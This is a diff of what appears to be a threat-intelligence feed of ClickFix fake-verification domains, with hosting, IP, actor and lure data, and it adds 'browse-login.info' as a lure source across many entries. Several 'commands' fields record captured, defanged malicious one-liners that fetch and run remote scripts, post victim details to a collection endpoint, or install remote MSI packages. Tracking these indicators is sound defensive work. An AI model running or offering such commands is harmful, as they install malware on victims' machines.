@@ -5,7 +5,7 @@
   "short": "Fake checks that get victims to paste and run a command",
   "summary": "A fake CAPTCHA, browser update or error message, usually injected into a hacked legitimate website, copies a command to the clipboard and tells the victim to paste it into the Run dialog, a terminal or PowerShell. The command downloads and runs malware, typically an information stealer or a remote-access tool. Some campaigns fetch their next stage from a public blockchain so the hacked site never has to change."
  },
- "count": 6312,
+ "count": 6310,
  "indicators": [
   {
    "indicator": "06services.it",
@@ -11486,6 +11486,7 @@
     "jjjducodes.beer",
     "browse-cloud.codes",
     "img-codes-cloude.info",
+    "browse-login.info",
     "codes.browse-cdn.beer"
    ]
   },
@@ -11893,6 +11894,7 @@
    ],
    "lure_from": [
     "browse-cloud.codes",
+    "browse-login.info",
     "codes.caffe-img.com",
     "codes.browse-cdn.beer"
    ]
@@ -12410,6 +12412,7 @@
     "ncheck-brows.beer"
    ],
    "lure_from": [
+    "browse-login.info",
     "codes.browse-cdn.beer",
     "jjjducodes.beer",
     "browse-cloud.codes",
@@ -16083,7 +16086,8 @@
    "lure_from": [
     "browse-cloud.codes",
     "codes.caffe-img.com",
-    "codes.browse-cdn.beer"
+    "codes.browse-cdn.beer",
+    "browse-login.info"
    ]
   },
   {
@@ -20419,7 +20423,8 @@
     "codes.browse-cdn.beer",
     "jjjducodes.beer",
     "browse-cloud.codes",
-    "img-codes-cloude.info"
+    "img-codes-cloude.info",
+    "browse-login.info"
    ]
   },
   {
@@ -23561,8 +23566,8 @@
    "actor_link": "linked",
    "commands": [
     "powershell -w h \"iex(irm 'fingerprint-veri[.]info/[id]'); Start-Sleep -Seconds 30\"; exit",
-    "curl -sL -d \"id=7585522d-0eea-4b0b-b984-[id]&location=America%2FNew_York%20%7C%20en-US&siteUrl=https%3A%2F%2Famhal-sono.ma%2F&os=Mac%2015&lastVisitAt=2026-11-19T15%3A28%3A38.467Z&lastShellAt=2026-11-19T15%3A28%3A38.467Z\" \"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\" && curl -s 'hxxps[:]//claude-flare-verification[.]vercel[.]app/mac' -L | sh",
-    "cmd.exe /c \"curl.exe -sL -d \"\"id=5aee25d2-ae7f-4fa1-9032-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Famhal-sono.ma%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-11-19T15%3A23%3A57.792Z\"\" -d \"\"lastShellAt=2026-11-19T15%3A23%3A57.792Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//claude-flare-verification[.]vercel[.]app/win -L | cmd\""
+    "curl -sL -d \"id=ce7a8a06-091e-4c46-a2e3-[id]&location=America%2FNew_York%20%7C%20en-US&siteUrl=https%3A%2F%2Famhal-sono.ma%2F&os=Mac%2015&lastVisitAt=2026-11-27T05%3A13%3A38.622Z&lastShellAt=2026-11-27T05%3A13%3A38.622Z\" \"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\" && curl -s 'hxxps[:]//claude-flare-verification[.]vercel[.]app/mac' -L | sh",
+    "cmd.exe /c \"curl.exe -sL -d \"\"id=0bfe4c2c-a1e4-47fd-a6f6-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Famhal-sono.ma%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-11-27T05%3A09%3A44.790Z\"\" -d \"\"lastShellAt=2026-11-27T05%3A09%3A44.790Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//claude-flare-verification[.]vercel[.]app/win -L | cmd\""
    ],
    "connects_to": [
     "fingerprint-veri.info"
@@ -23572,7 +23577,8 @@
     "codes.browse-cdn.beer",
     "jjjducodes.beer",
     "browse-cloud.codes",
-    "img-codes-cloude.info"
+    "img-codes-cloude.info",
+    "browse-login.info"
    ]
   },
   {
@@ -26158,7 +26164,8 @@
     "codes.browse-cdn.beer",
     "jjjducodes.beer",
     "browse-cloud.codes",
-    "img-codes-cloude.info"
+    "img-codes-cloude.info",
+    "browse-login.info"
    ]
   },
   {
@@ -28268,7 +28275,7 @@
    "role": "Redirector",
    "status": "online",
    "first_seen": "2026-11-25",
-   "last_seen": "2026-11-26",
+   "last_seen": "2026-11-27",
    "last_online": "2026-11-27",
    "offline_since": null,
    "url": "https://aptma.org.pk/",
@@ -28276,11 +28283,18 @@
    "product": null,
    "hosting": "Cloudflare (proxied)",
    "dns": "Cloudflare",
-   "ip": "188.114.97.3",
+   "ip": "172.67.183.201",
    "asn": "AS13335",
    "org": "CLOUDFLARENET - Cloudflare, Inc., US",
    "country": null,
    "ips": [
+    {
+     "ip": "172.67.183.201",
+     "asn": "AS13335",
+     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
+     "first_seen": "2026-11-27",
+     "last_seen": "2026-11-27"
+    },
     {
      "ip": "188.114.97.3",
      "asn": "AS13335",
@@ -28294,7 +28308,7 @@
      "host": "aptma.org.pk",
      "status": "online",
      "first_seen": "2026-11-25",
-     "last_seen": "2026-11-26"
+     "last_seen": "2026-11-27"
     }
    ],
    "actor": null,
@@ -31742,7 +31756,8 @@
     "codes.browse-cdn.beer",
     "jjjducodes.beer",
     "browse-cloud.codes",
-    "img-codes-cloude.info"
+    "img-codes-cloude.info",
+    "browse-login.info"
    ]
   },
   {
@@ -32729,6 +32744,7 @@
    "actor": null,
    "actor_link": null,
    "commands": [
+    "powershell -c \"\"Invoke-Expression((Get-Clipboard)[1..((Get-Clipboard).Count - 1)] -join \"\"\"\"`n\"\"\"\");\"\" echo \" ____ _ _ __ _ / ___| | ___ _ _ __| |/ _| | __ _ _ __ ___ | | | |/ _ \\| | | |/ _ | |_| |/ _ | __/ _ \\ | |___| | (_) | |_| | (_| | _| | (_| | | | __/ \\____|_|\\___/ \\__,_|\\__,_|_| |_|\\__,_|_| \\___| \"` Write-Output \"Initializing verification ...\" Start-Sleep -Milliseconds 618 $updateloadUrl = '[encoded]' $bytes = [Convert]::FromBase64String($updateloadUrl) $clean = [Text.Encoding]::Unicode.GetString($bytes) Start-Sleep -Milliseconds 530 Write-Output \"Processing request ...\" Start-Sleep -Milliseconds 993 Write-Host -NoNewline \"Verification successful. Continuing. Please wait a few seconds and do not close this window \" for ($i = 0; $i -lt 5; $i++) { Start-Sleep -Milliseconds 400 Write-Host -NoNewline \".\" } Invoke-Expression $clean",
     "irm 'ncheck-brows[.]beer/[id]'|iex"
    ],
    "connects_to": [
@@ -32738,7 +32754,10 @@
     "codes.browse-cdn.beer",
     "jjjducodes.beer",
     "browse-cloud.codes",
-    "img-codes-cloude.info"
+    "img-codes-cloude.info",
+    "browse-login.info",
+    "tthcsslread21.cc",
+    "tlschssl22read.cc"
    ]
   },
   {
@@ -72252,7 +72271,8 @@
     "codes.browse-cdn.beer",
     "jjjducodes.beer",
     "browse-cloud.codes",
-    "img-codes-cloude.info"
+    "img-codes-cloude.info",
+    "browse-login.info"
    ]
   },
   {
@@ -76325,7 +76345,8 @@
     "codes.browse-cdn.beer",
     "jjjducodes.beer",
     "browse-cloud.codes",
-    "img-codes-cloude.info"
+    "img-codes-cloude.info",
+    "browse-login.info"
    ]
   },
   {
@@ -81933,7 +81954,8 @@
     "servicestatlab.com",
     "codes.browse-cdn.beer",
     "jjjducodes.beer",
-    "browse-cloud.codes"
+    "browse-cloud.codes",
+    "browse-login.info"
    ]
   },
   {
@@ -83648,7 +83670,8 @@
     "codes.browse-cdn.beer",
     "jjjducodes.beer",
     "browse-cloud.codes",
-    "img-codes-cloude.info"
+    "img-codes-cloude.info",
+    "browse-login.info"
    ]
   },
   {
@@ -86878,7 +86901,8 @@
     "jjjducodes.beer",
     "browse-cloud.codes",
     "codes.browse-cdn.beer",
-    "img-codes-cloude.info"
+    "img-codes-cloude.info",
+    "browse-login.info"
    ]
   },
   {
@@ -87697,6 +87721,56 @@
    ],
    "lure_from": [
     "interseq.at"
+   ]
+  },
+  {
+   "indicator": "dailygrynde.com",
+   "type": "domain",
+   "category": "clickfix",
+   "backend_for": null,
+   "campaign": null,
+   "role": "Phishing page",
+   "status": "online",
+   "first_seen": "2026-11-01",
+   "last_seen": "2026-11-02",
+   "last_online": "2026-11-27",
+   "offline_since": null,
+   "url": "https://dailygrynde.com/",
+   "brand": null,
+   "product": null,
+   "hosting": "Google Cloud",
+   "dns": "mediatemple.net",
+   "ip": "35.237.216.152",
+   "asn": "AS396982",
+   "org": "GOOGLE-CLOUD-PLATFORM - Google LLC, US",
+   "country": "US",
+   "ips": [
+    {
+     "ip": "35.237.216.152",
+     "asn": "AS396982",
+     "org": "GOOGLE-CLOUD-PLATFORM - Google LLC, US",
+     "first_seen": "2026-11-01",
+     "last_seen": "2026-11-02"
+    }
+   ],
+   "hosts": [
+    {
+     "host": "dailygrynde.com",
+     "status": "online",
+     "first_seen": "2026-11-01",
+     "last_seen": "2026-11-02"
+    }
+   ],
+   "actor": null,
+   "actor_link": null,
+   "commands": [
+    "irm 'ncheck-brows[.]beer/[id]'|iex"
+   ],
+   "connects_to": [
+    "ncheck-brows.beer"
+   ],
+   "lure_from": [
+    "browse-login.info"
    ]
   },
   {
@@ -91257,7 +91331,8 @@
     "codes.browse-cdn.beer",
     "jjjducodes.beer",
     "browse-cloud.codes",
-    "img-codes-cloude.info"
+    "img-codes-cloude.info",
+    "browse-login.info"
    ]
   },
   {
@@ -91576,7 +91651,8 @@
     "codes.browse-cdn.beer",
     "jjjducodes.beer",
     "browse-cloud.codes",
-    "img-codes-cloude.info"
+    "img-codes-cloude.info",
+    "browse-login.info"
    ]
   },
   {
@@ -92314,13 +92390,13 @@
     "jscdncloude.beer",
     "id-verfied.boats",
     "cloud-browse.codes",
-    "ncheck-brows.beer",
-    "verifing-server.codes"
+    "ncheck-brows.beer"
    ],
    "lure_from": [
     "codes.browse-cdn.beer",
     "browse-cloud.codes",
-    "codes.caffe-img.com"
+    "codes.caffe-img.com",
+    "browse-login.info"
    ]
   },
   {
@@ -94315,7 +94391,8 @@
     "codes.browse-cdn.beer",
     "jjjducodes.beer",
     "browse-cloud.codes",
-    "img-codes-cloude.info"
+    "img-codes-cloude.info",
+    "browse-login.info"
    ]
   },
   {
@@ -94514,9 +94591,9 @@
    ],
    "connects_to": [
     "hagosuro.lc",
-    "j7tracker.gb.net",
     "gfisoda.biz",
     "pkgsetup3.tools",
+    "j7tracker.gb.net",
     "appget29.tools"
    ],
    "lure_from": [
@@ -95278,7 +95355,8 @@
    "lure_from": [
     "codes.browse-cdn.beer",
     "jjjducodes.beer",
-    "browse-cloud.codes"
+    "browse-cloud.codes",
+    "browse-login.info"
    ]
   },
   {
@@ -106886,7 +106964,8 @@
     "codes.browse-cdn.beer",
     "jjjducodes.beer",
     "browse-cloud.codes",
-    "img-codes-cloude.info"
+    "img-codes-cloude.info",
+    "browse-login.info"
    ]
   },
   {
@@ -107876,16 +107955,17 @@
    "actor": "dprk",
    "actor_link": "linked",
    "commands": [
-    "curl -sL -d \"id=dd48e5bd-3bd5-4f3f-9994-[id]&location=America%2FNew_York%20%7C%20en-US&siteUrl=https%3A%2F%2Feliteaviationacademy.com.au%2F&os=Mac%2015&lastVisitAt=2026-11-19T14%3A35%3A01.915Z&lastShellAt=2026-11-19T14%3A35%3A01.915Z\" \"hxxps[:]//script[.]google[.]com/macros/s/AKfycbwR4W_Fm4dL82LZC49P_G58-W06_Z_TMez_MEHLaklDe_nTe5wlqlWBsD02XGR-KYIX3A/exec\" && curl -fsSL \"hxxps[:]//softify[.]lat/u/8ecec3ba\" | sh",
     "powershell -w h \"iex(irm 'fingerprint-veri[.]info/[id]'); Start-Sleep -Seconds 30\"; exit",
-    "cmd.exe /c \"curl.exe -sL -d \"\"id=d6c28dec-a9b2-405e-8ae8-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Feliteaviationacademy.com.au%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-11-19T14%3A22%3A21.296Z\"\" -d \"\"lastShellAt=2026-11-19T14%3A22%3A21.296Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbwR4W_Fm4dL82LZC49P_G58-W06_Z_TMez_MEHLaklDe_nTe5wlqlWBsD02XGR-KYIX3A/exec\"\" & curl.exe -fsSL \"\"hxxps[:]//softify[.]lat/w/8ecec3ba\"\" | powershell\""
+    "curl -sL -d \"id=5df64888-0dd0-4fe9-94e6-[id]&location=America%2FNew_York%20%7C%20en-US&siteUrl=https%3A%2F%2Feliteaviationacademy.com.au%2F&os=Mac%2015&lastVisitAt=2026-11-27T05%3A13%3A14.497Z&lastShellAt=2026-11-27T05%3A13%3A14.497Z\" \"hxxps[:]//script[.]google[.]com/macros/s/AKfycbwR4W_Fm4dL82LZC49P_G58-W06_Z_TMez_MEHLaklDe_nTe5wlqlWBsD02XGR-KYIX3A/exec\" && curl -fsSL \"hxxps[:]//softify[.]lat/u/8ecec3ba\" | sh",
+    "cmd.exe /c \"curl.exe -sL -d \"\"id=79ae680c-ff87-4046-a081-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Feliteaviationacademy.com.au%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-11-27T04%3A55%3A23.086Z\"\" -d \"\"lastShellAt=2026-11-27T04%3A55%3A23.086Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbwR4W_Fm4dL82LZC49P_G58-W06_Z_TMez_MEHLaklDe_nTe5wlqlWBsD02XGR-KYIX3A/exec\"\" & curl.exe -fsSL \"\"hxxps[:]//softify[.]lat/w/8ecec3ba\"\" | powershell\""
    ],
    "connects_to": [
     "softify.lat",
     "fingerprint-veri.info"
    ],
    "lure_from": [
-    "img-codes-cloude.info"
+    "img-codes-cloude.info",
+    "browse-login.info"
    ]
   },
   {
@@ -115535,58 +115615,6 @@
    ]
   },
   {
-   "indicator": "farmaciamicenas.com.br",
-   "type": "domain",
-   "category": "clickfix",
-   "backend_for": null,
-   "campaign": null,
-   "role": "Redirector",
-   "status": "online",
-   "first_seen": "2026-11-09",
-   "last_seen": "2026-11-11",
-   "last_online": "2026-11-27",
-   "offline_since": null,
-   "url": "https://farmaciamicenas.com.br/",
-   "brand": null,
-   "product": null,
-   "hosting": "- D S CUPERTINO SERVICOS DE HOSPEDAGEM NA INTERNET",
-   "dns": "isstechnology.inf.br",
-   "ip": "200.11.120.49",
-   "asn": "AS270439",
-   "org": "AS270439 - D S CUPERTINO SERVICOS DE HOSPEDAGEM NA INTERNET, BR",
-   "country": "BR",
-   "ips": [
-    {
-     "ip": "200.11.120.49",
-     "asn": "AS270439",
-     "org": "AS270439 - D S CUPERTINO SERVICOS DE HOSPEDAGEM NA INTERNET, BR",
-     "first_seen": "2026-11-09",
-     "last_seen": "2026-11-11"
-    }
-   ],
-   "hosts": [
-    {
-     "host": "farmaciamicenas.com.br",
-     "status": "online",
-     "first_seen": "2026-11-09",
-     "last_seen": "2026-11-11"
-    }
-   ],
-   "actor": null,
-   "actor_link": null,
-   "commands": [
-    "(irm 'hxxps[:]//github[.]pw/danteproliv1/[id]')|iex",
-    "(irm 'hxxps[:]//t-trustresnew[.]com/danteproliv1/[id]')|iex"
-   ],
-   "connects_to": [
-    "github.pw",
-    "t-trustresnew.com"
-   ],
-   "lure_from": [
-    "interseq.at"
-   ]
-  },
-  {
    "indicator": "farmhousecoffeebeans.com",
    "type": "domain",
    "category": "clickfix",
@@ -116400,58 +116428,6 @@
     "entitlementcheck.pro"
    ],
    "lure_from": []
-  },
-  {
-   "indicator": "fauniforms.com",
-   "type": "domain",
-   "category": "clickfix",
-   "backend_for": null,
-   "campaign": null,
-   "role": "Phishing page",
-   "status": "online",
-   "first_seen": "2026-11-01",
-   "last_seen": "2026-11-01",
-   "last_online": "2026-11-27",
-   "offline_since": null,
-   "url": "https://fauniforms.com/",
-   "brand": null,
-   "product": null,
-   "hosting": "Hostinger",
-   "dns": "dns-parking.com",
-   "ip": "2a02:4780:11:1434:0:d10:223d:3",
-   "asn": "AS47583",
-   "org": "AS-HOSTINGER Hostinger International Limited, CY",
-   "country": "IN",
-   "ips": [
-    {
-     "ip": "2a02:4780:11:1434:0:d10:223d:3",
-     "asn": "AS47583",
-     "org": "AS-HOSTINGER Hostinger International Limited, CY",
-     "first_seen": "2026-11-01",
-     "last_seen": "2026-11-01"
-    }
-   ],
-   "hosts": [
-    {
-     "host": "fauniforms.com",
-     "status": "online",
-     "first_seen": "2026-11-01",
-     "last_seen": "2026-11-01"
-    }
-   ],
-   "actor": null,
-   "actor_link": null,
-   "commands": [
-    "irm 'ncheck-brows[.]beer/[id]'|iex"
-   ],
-   "connects_to": [
-    "ncheck-brows.beer"
-   ],
-   "lure_from": [
-    "codes.browse-cdn.beer",
-    "jjjducodes.beer",
-    "browse-cloud.codes"
-   ]
   },
   {
    "indicator": "fbchim.dz",
@@ -122646,7 +122622,8 @@
    "connects_to": [],
    "lure_from": [
     "cloudeccentric.cc",
-    "img-codes-cloude.info"
+    "img-codes-cloude.info",
+    "browse-login.info"
    ]
   },
   {
@@ -128224,18 +128201,11 @@
    "product": null,
    "hosting": "Cloudflare (proxied)",
    "dns": "Cloudflare",
-   "ip": "172.67.150.153",
+   "ip": "188.114.96.3",
    "asn": "AS13335",
    "org": "CLOUDFLARENET - Cloudflare, Inc., US",
    "country": null,
    "ips": [
-    {
-     "ip": "172.67.150.153",
-     "asn": "AS13335",
-     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
-     "first_seen": "2026-11-26",
-     "last_seen": "2026-11-27"
-    },
     {
      "ip": "188.114.96.3",
      "asn": "AS13335",
@@ -128245,6 +128215,13 @@
     },
     {
      "ip": "188.114.97.3",
+     "asn": "AS13335",
+     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
+     "first_seen": "2026-11-26",
+     "last_seen": "2026-11-27"
+    },
+    {
+     "ip": "172.67.150.153",
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-11-26",
@@ -129627,7 +129604,7 @@
    "product": null,
    "hosting": "Cloudflare (proxied)",
    "dns": "Cloudflare",
-   "ip": "188.114.96.3",
+   "ip": "188.114.97.3",
    "asn": "AS13335",
    "org": "CLOUDFLARENET - Cloudflare, Inc., US",
    "country": null,
@@ -130906,6 +130883,7 @@
    ],
    "lure_from": [
     "browse-cloud.codes",
+    "browse-login.info",
     "interseq.at",
     "codes.caffe-img.com",
     "codes.browse-cdn.beer"
@@ -135671,7 +135649,7 @@
    "product": null,
    "hosting": "Cloudflare (proxied)",
    "dns": "Cloudflare",
-   "ip": "104.21.61.181",
+   "ip": "172.67.212.158",
    "asn": "AS13335",
    "org": "CLOUDFLARENET - Cloudflare, Inc., US",
    "country": null,
@@ -139868,15 +139846,19 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "echo '[encoded]' | base64 -d | zsh # CLOUDFLARE® ALL RIGHTS RESERVED",
-    "mSIexEc.exe /package http:\\/wiufen.cfd\\5bvfuud /Q S1=\"𝗩​𝝞​𝝩𝝖𝗟 𝗟𝝚𝝖​𝗩​𝝚 𝝦​𝗥​𝝚𝗦𝗦 𝝚​𝝢𝝩𝝚​𝗥 \""
+    "bash -c 'curl -fsSL \"hxxps[:]//ld-me[.]sbs/c?ray-id=dbalsxn\" | bash # CLOUDFLARE® ALL RIGHTS RESERVED'",
+    "msIEXEc.exe /package http:\\/oinret.cfd\\dbalsxn /Q S1=\"𝗩​𝝞𝝩𝝖​𝗟 𝗖​𝗟𝝞​𝝦 𝝦​𝗥𝝚​𝗦𝗦 𝝚𝝢​𝝩​𝝚𝗥 \"",
+    "echo '[encoded]' | base64 -d | zsh # CLOUDFLARE® ALL RIGHTS RESERVED"
    ],
    "connects_to": [
+    "ld-me.sbs",
+    "oinret.cfd",
     "youtb7st.top",
     "wiufen.cfd"
    ],
    "lure_from": [
-    "img-codes-cloude.info"
+    "img-codes-cloude.info",
+    "browse-login.info"
    ]
   },
   {
@@ -141356,7 +141338,7 @@
    "role": "Redirector",
    "status": "offline",
    "first_seen": "2026-10-26",
-   "last_seen": "2026-10-29",
+   "last_seen": "2026-11-27",
    "last_online": "2026-11-27",
    "offline_since": "2026-11-27",
    "url": "https://guilenia.com/",
@@ -141374,7 +141356,7 @@
      "asn": "AS31898",
      "org": "ORACLE-BMC-31898 - Oracle Corporation, US",
      "first_seen": "2026-10-26",
-     "last_seen": "2026-10-29"
+     "last_seen": "2026-11-27"
     }
    ],
    "hosts": [
@@ -141382,7 +141364,7 @@
      "host": "guilenia.com",
      "status": "offline",
      "first_seen": "2026-10-26",
-     "last_seen": "2026-10-29"
+     "last_seen": "2026-11-27"
     }
    ],
    "actor": null,
@@ -142939,58 +142921,6 @@
    ],
    "lure_from": [
     "interseq.at"
-   ]
-  },
-  {
-   "indicator": "hackingtool.online",
-   "type": "domain",
-   "category": "clickfix",
-   "backend_for": null,
-   "campaign": null,
-   "role": "Phishing page",
-   "status": "online",
-   "first_seen": "2026-11-01",
-   "last_seen": "2026-11-01",
-   "last_online": "2026-11-27",
-   "offline_since": null,
-   "url": "https://hackingtool.online/",
-   "brand": "Meta",
-   "product": "WhatsApp",
-   "hosting": "Hostinger",
-   "dns": "dns-parking.com",
-   "ip": "2a02:4780:5c:2152:0:3a03:790f:2",
-   "asn": "AS47583",
-   "org": "AS-HOSTINGER Hostinger International Limited, CY",
-   "country": "MY",
-   "ips": [
-    {
-     "ip": "2a02:4780:5c:2152:0:3a03:790f:2",
-     "asn": "AS47583",
-     "org": "AS-HOSTINGER Hostinger International Limited, CY",
-     "first_seen": "2026-11-01",
-     "last_seen": "2026-11-01"
-    }
-   ],
-   "hosts": [
-    {
-     "host": "hackingtool.online",
-     "status": "online",
-     "first_seen": "2026-11-01",
-     "last_seen": "2026-11-01"
-    }
-   ],
-   "actor": null,
-   "actor_link": null,
-   "commands": [
-    "irm 'ncheck-brows[.]beer/[id]'|iex"
-   ],
-   "connects_to": [
-    "ncheck-brows.beer"
-   ],
-   "lure_from": [
-    "codes.browse-cdn.beer",
-    "jjjducodes.beer",
-    "browse-cloud.codes"
    ]
   },
   {
@@ -152081,8 +152011,8 @@
    ],
    "connects_to": [
     "trek-72.com",
-    "t-trustrest.com",
     "j7tracker.gb.net",
+    "t-trustrest.com",
     "github.pw",
     "t-trustresnew.com",
     "trustchecknes.com"
@@ -164103,11 +164033,18 @@
    "product": null,
    "hosting": "Cloudflare (proxied)",
    "dns": "Cloudflare",
-   "ip": "2a06:98c1:3120::3",
+   "ip": "188.114.97.3",
    "asn": "AS13335",
    "org": "CLOUDFLARENET - Cloudflare, Inc., US",
    "country": null,
    "ips": [
+    {
+     "ip": "172.67.161.106",
+     "asn": "AS13335",
+     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
+     "first_seen": "2026-11-26",
+     "last_seen": "2026-11-27"
+    },
     {
      "ip": "188.114.97.3",
      "asn": "AS13335",
@@ -164124,13 +164061,6 @@
     },
     {
      "ip": "104.21.90.212",
-     "asn": "AS13335",
-     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
-     "first_seen": "2026-11-26",
-     "last_seen": "2026-11-27"
-    },
-    {
-     "ip": "172.67.161.106",
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-11-26",
@@ -172733,20 +172663,20 @@
    "product": null,
    "hosting": "Cloudflare (proxied)",
    "dns": "Cloudflare",
-   "ip": "188.114.96.3",
+   "ip": "188.114.97.3",
    "asn": "AS13335",
    "org": "CLOUDFLARENET - Cloudflare, Inc., US",
    "country": null,
    "ips": [
     {
-     "ip": "188.114.96.3",
+     "ip": "188.114.97.3",
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-11-26",
      "last_seen": "2026-11-27"
     },
     {
-     "ip": "188.114.97.3",
+     "ip": "188.114.96.3",
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-11-26",
@@ -186202,16 +186132,16 @@
    "commands": [
     "(irm 'hxxp[:]//hagosuro[.]lc/dantestraff18/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})|iex",
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null",
-    "(irm 'hxxps[:]//lepafonso[.]bz/dantestraff2929/[id]' -UserAgent 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6246.20 Safari/537.36' -Headers @{'X-WUA'='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6246.20 Safari/537.36'} -TimeoutSec 45)|iex"
+    "(irm 'hxxps[:]//j7tracker[.]gb[.]net/prolivdante1/[id]')|iex"
    ],
    "connects_to": [
     "hagosuro.lc",
     "xorados.com",
     "trek-72.com",
     "t-trustrest.com",
-    "github.pw",
-    "lepafonso.bz",
     "j7tracker.gb.net",
+    "lepafonso.bz",
+    "github.pw",
     "trustchecknes.com",
     "groverudder12.com"
    ],
@@ -191139,8 +191069,8 @@
     "xorados.com",
     "trek-72.com",
     "t-trustrest.com",
-    "github.pw",
     "j7tracker.gb.net",
+    "github.pw",
     "t-trustresnew.com",
     "lepafonso.bz",
     "trustchecknes.com",
@@ -191151,6 +191081,7 @@
     "ncheck-brows.beer",
     "jjjducodes.beer",
     "browse-cloud.codes",
+    "browse-login.info",
     "img-codes-cloude.info"
    ]
   },
@@ -197346,7 +197277,7 @@
    "product": null,
    "hosting": "Cloudflare (proxied)",
    "dns": "Cloudflare",
-   "ip": "188.114.96.3",
+   "ip": "188.114.97.3",
    "asn": "AS13335",
    "org": "CLOUDFLARENET - Cloudflare, Inc., US",
    "country": null,
@@ -205642,7 +205573,7 @@
    "product": null,
    "hosting": "Cloudflare (proxied)",
    "dns": "Cloudflare",
-   "ip": "188.114.96.3",
+   "ip": "104.21.77.76",
    "asn": "AS13335",
    "org": "CLOUDFLARENET - Cloudflare, Inc., US",
    "country": null,
@@ -208388,7 +208319,8 @@
     "codes.browse-cdn.beer",
     "jjjducodes.beer",
     "browse-cloud.codes",
-    "img-codes-cloude.info"
+    "img-codes-cloude.info",
+    "browse-login.info"
    ]
   },
   {
@@ -208906,6 +208838,7 @@
     "interseq.at",
     "ncheck-brows.beer",
     "img-codes-cloude.info",
+    "browse-login.info",
     "codes.browse-cdn.beer",
     "jjjducodes.beer",
     "browse-cloud.codes"
@@ -218900,7 +218833,7 @@
    "product": null,
    "hosting": "Cloudflare (proxied)",
    "dns": "Cloudflare",
-   "ip": "172.67.176.77",
+   "ip": "104.21.88.99",
    "asn": "AS13335",
    "org": "CLOUDFLARENET - Cloudflare, Inc., US",
    "country": null,
@@ -225579,6 +225512,59 @@
     "dns-api.org"
    ],
    "lure_from": []
+  },
+  {
+   "indicator": "ocucc.org",
+   "type": "domain",
+   "category": "clickfix",
+   "backend_for": null,
+   "campaign": null,
+   "role": "Phishing page",
+   "status": "online",
+   "first_seen": "2026-10-28",
+   "last_seen": "2026-11-11",
+   "last_online": "2026-11-27",
+   "offline_since": null,
+   "url": "https://ocucc.org/[redacted]/",
+   "brand": null,
+   "product": null,
+   "hosting": "Hostinger",
+   "dns": "dns-parking.com",
+   "ip": "92.113.23.243",
+   "asn": "AS47583",
+   "org": "AS-HOSTINGER Hostinger International Limited, CY",
+   "country": "DE",
+   "ips": [
+    {
+     "ip": "92.113.23.243",
+     "asn": "AS47583",
+     "org": "AS-HOSTINGER Hostinger International Limited, CY",
+     "first_seen": "2026-10-28",
+     "last_seen": "2026-11-11"
+    }
+   ],
+   "hosts": [
+    {
+     "host": "ocucc.org",
+     "status": "online",
+     "first_seen": "2026-10-28",
+     "last_seen": "2026-11-11"
+    }
+   ],
+   "actor": null,
+   "actor_link": null,
+   "commands": [
+    "irm 'ncheck-brows[.]beer/[id]'|iex"
+   ],
+   "connects_to": [
+    "ncheck-brows.beer"
+   ],
+   "lure_from": [
+    "codes.caffe-img.com",
+    "codes.browse-cdn.beer",
+    "jjjducodes.beer",
+    "browse-login.info"
+   ]
   },
   {
    "indicator": "offerlauncher.net",
@@ -233724,20 +233710,20 @@
    "product": null,
    "hosting": "Cloudflare (proxied)",
    "dns": "Cloudflare",
-   "ip": "188.114.96.3",
+   "ip": "188.114.97.3",
    "asn": "AS13335",
    "org": "CLOUDFLARENET - Cloudflare, Inc., US",
    "country": null,
    "ips": [
     {
-     "ip": "188.114.96.3",
+     "ip": "188.114.97.3",
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-11-26",
      "last_seen": "2026-11-27"
     },
     {
-     "ip": "188.114.97.3",
+     "ip": "188.114.96.3",
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-11-26",
@@ -234461,8 +234447,7 @@
     "ncheck-brows.beer",
     "jscdncloude.beer",
     "cloud-browse.codes",
-    "id-verfied.boats",
-    "verifing-server.codes"
+    "id-verfied.boats"
    ],
    "lure_from": [
     "codes.caffe-img.com",
@@ -238034,7 +238019,7 @@
    "product": null,
    "hosting": "Cloudflare (proxied)",
    "dns": "Cloudflare",
-   "ip": "2a06:98c1:3120::3",
